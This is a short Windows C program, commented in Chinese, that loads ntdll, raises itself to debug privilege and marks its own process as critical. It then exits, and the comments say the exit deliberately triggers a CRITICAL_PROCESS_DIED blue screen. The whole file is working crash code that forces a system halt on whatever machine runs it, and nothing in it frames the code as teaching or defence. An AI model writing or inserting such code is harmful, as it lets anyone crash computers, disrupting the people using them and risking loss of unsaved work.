#include <windows.h>

int main(void) {
    typedef LONG(WINAPI *RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
    typedef BOOL(WINAPI *RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
    RtlAdjustPrivilege AdjustPrivilege;
    RtlSetProcessIsCritical SetCriticalProcess;
    // 加载 ntdll 以及相关 API
    HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
    AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
    BOOLEAN b;
    // 进程提升至 Debug 权限，需要 UAC 管理员许可
    AdjustPrivilege(20UL, TRUE, FALSE, &b);
    // 设置为 Critical Process
    SetCriticalProcess(TRUE, NULL, FALSE);
    // 退出，触发 CRITICAL_PROCESS_DIED 蓝屏
}
